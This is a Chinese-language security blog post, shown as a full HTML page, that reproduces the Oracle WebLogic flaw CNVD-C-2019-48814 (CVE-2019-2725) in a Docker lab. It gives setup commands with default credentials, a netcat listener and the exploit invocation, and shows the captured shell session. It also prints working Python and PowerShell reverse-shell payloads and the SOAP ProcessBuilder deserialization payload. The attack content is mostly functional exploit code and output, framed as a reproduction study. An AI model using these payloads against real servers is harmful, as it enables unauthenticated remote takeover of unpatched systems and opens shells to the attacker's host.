<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="damn1t">
  <!-- Open Graph Data -->
  <meta property="og:title" content="CNVD-C-2019-48814"/>
  <meta property="og:description" content="404" />
  <meta property="og:site_name" content="damn1t"/>
  <meta property="og:type" content="article" />
  <meta property="og:image" content="http://microvorld.com"/>
  
    <link rel="alternate" href="/atom.xml" title="damn1t" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>damn1t</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.light.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">CNVD-C-2019-48814</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/microvorld">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:<bubbl3@foxmail.com>">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By damn1t</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2019-05-04</span>
            <span class="time">15:05:06</span>
          </span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/tags/cve/">#cve</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">http://localhost:49163/console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
<p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
<p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py -l 192.168.10.144 -p 2333 -r http://192.168.10.145:49163</span><br></pre></td></tr></table></figure></p>
<p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
<blockquote>
<p>listening on [any] 2333 …<br>192.168.10.145: inverse host lookup failed: Unknown host<br>connect to [192.168.10.144] from (UNKNOWN) [192.168.10.145] 36844<br>sh: no job control in this shell<br>sh-4.2$ whoami<br>whoami<br>oracle<br>sh-4.2$ ls<br>ls<br>autodeploy<br>bin<br>common<br>config<br>console-ext<br>derby.log<br>fileRealm.properties<br>init-info<br>lib<br>nodemanager<br>security<br>servers<br>startWebLogic.sh<br>sh-4.2$ </p>
</blockquote>
<p>漏洞描述：</p>
<blockquote>
<p>Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server</p>
</blockquote>
<p>poc分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, check, rhost, lhost, lport, windows):</span><br></pre></td></tr></table></figure></p>
<p>url检查，测定漏洞点存在与否<br>目标地址，监听地址和端口<br><strong>windows</strong>则是检查目标的操作系统，默认为unix，若为windows则要添加参数<br>unix或linux下的shell生成方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    &quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.&quot;</span><br><span class="line">    &quot;SOCK_STREAM);s.connect((\&quot;&#123;lhost&#125;\&quot;,&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2(&quot;</span><br><span class="line">    &quot;s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;&quot;</span><br><span class="line">).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure></p>
<p>windows下shell生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    r&quot;powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) &quot;</span><br><span class="line">    r&quot;&#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a=&apos;&quot; + self.lhost +&quot;&quot;</span><br><span class="line">    r&quot;&apos;;$p=&apos;&quot;+ self.lport + &quot;&apos;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a&quot;</span><br><span class="line">    r&quot;,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;&quot;</span><br><span class="line">    r&quot;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&apos;cmd.exe&apos;;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;&quot;</span><br><span class="line">    r&quot;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;&quot;</span><br><span class="line">    r&quot;while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;&quot;</span><br><span class="line">    r&quot;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;&quot;</span><br><span class="line">    r&quot;while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0)&quot;</span><br><span class="line">    r&quot; -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;&quot;</span><br><span class="line">    r&quot;if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;&quot;</span><br><span class="line">    r&quot;if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if &quot;</span><br><span class="line">    r&quot;($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne&quot;</span><br><span class="line">    r&quot; -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=&apos;&apos;&#125;&#125;;$s.Write($e.&quot;</span><br><span class="line">    r&quot;GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;&quot;</span><br></pre></td></tr></table></figure></p>
<p>exp部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def get_process_builder_payload(self):</span><br><span class="line">        process_builder_payload = &apos;&apos;&apos;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">    &lt;soapenv:Header&gt; </span><br><span class="line">        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">                    &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_base&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_opt&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_payload&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                &lt;/array&gt;</span><br><span class="line">            &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;&apos;&apos;&apos;</span><br><span class="line">        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),</span><br><span class="line">                                      cmd_payload=self.cmd_payload)</span><br></pre></td></tr></table></figure></p>
<p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
<p>分析参考：<br><a href="https://paper.seebug.org/909/#417" target="_blank" rel="noopener">https://paper.seebug.org/909/#417</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a><br><a href="http://pupiles.com/xmldecoder.html" target="_blank" rel="noopener">http://pupiles.com/xmldecoder.html</a></p>
<p>复现参考：<br><a href="https://www.o2oxy.cn/2204.html" target="_blank" rel="noopener">https://www.o2oxy.cn/2204.html</a></p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

